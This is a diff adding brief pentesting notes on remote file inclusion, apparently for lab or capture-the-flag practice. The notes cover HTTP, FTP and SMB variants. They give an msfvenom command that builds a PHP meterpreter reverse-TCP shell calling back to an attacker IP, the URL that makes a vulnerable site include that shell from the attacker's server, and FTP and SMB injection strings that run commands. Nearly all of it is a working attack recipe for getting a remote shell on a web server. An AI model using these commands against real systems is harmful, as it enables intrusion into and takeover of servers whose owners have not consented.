@@ -1,0 +1,25 @@
+RFI
+http rfi
+    Use the following shell in rfi and host a server in the directory
+we use .txt format because sometimes server executes php on our machine isntead of victim
+    msfvenom -p php/meterpreter/reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f raw > shell.txt
+
+    Now go to the url and include your webserver and file alongside it
+    http://site.com?example.php=http://10.4.30.255:80/shell.txt
+    Listen on msf handler with the php/meterpreter/reverse_tcp set
+
+we can also include a normal shell instead of a msf exploit
+
+ftp rfi
+    start a ftp server where you shell is
+python3 -m pyftpdlib -p21
+
+    in injection point include
+
+    ?param=ftp://ipaddress/shell.php&cmdid
+
+smb rfi
+    start a impacket smb server and if target is windows this is helpful
+    we can directly include it as an smb share
+?param=\ipaddress\sharename\shell.php&cmd=id
+
